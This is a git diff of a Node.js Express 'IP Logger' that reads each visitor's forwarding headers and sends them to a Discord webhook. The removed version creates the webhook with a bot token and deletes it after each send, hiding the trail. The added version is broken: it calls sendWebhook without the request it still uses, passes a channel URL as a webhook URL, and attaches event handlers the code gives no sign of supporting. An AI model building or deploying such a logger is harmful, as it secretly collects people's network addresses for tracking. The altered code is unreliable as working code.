@@ -20,18 +20,7 @@ async function sendWebhook() {
   const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];
 
   try {
-    const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
-    const webhookResponse = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bot ${botToken}`,
-      },
-      body: JSON.stringify({ name: 'Logger Webhook' }),
-    });
-    const webhookData = await webhookResponse.json();
-    const webhookUrl = `https://discord.com/api/v10/webhooks/${webhookData.id}/${webhookData.token}`;
-    const webhook = new Webhook(webhookUrl);
+    const webhook = new Webhook(`https://discord.com/api/v10/channels/${channelID}/webhooks`);
 
     const embed = new MessageBuilder()
       .setTitle('IP Logger')
@@ -51,14 +40,13 @@ async function sendWebhook() {
 
     await webhook.send(embed);
 
-    await fetch(webhookUrl, {
-      method: 'DELETE',
-      headers: {
-        'Authorization': `Bot ${botToken}`,
-      },
+    webhook.on('error', error => {
+      console.error(`Error sending webhook: ${error}`);
     });
 
-    res.send('Address Logged');
+    webhook.on('success', () => {
+      console.log('Webhook sent successfully');
+    });
   } catch (error) {
     console.error(`Error handling request: ${error}`);
     res.status(500).send('Internal server error');
@@ -66,7 +54,13 @@ async function sendWebhook() {
 }
 
 app.get('/', async (req, res) => {
-  await sendWebhook(req, res);
+  try {
+    await sendWebhook();
+    res.send('Address Logged');
+  } catch (error) {
+    console.error(`Error handling request: ${error}`);
+    res.status(500).send('Internal server error');
+  }
 });
 
 app.listen(port, () => {
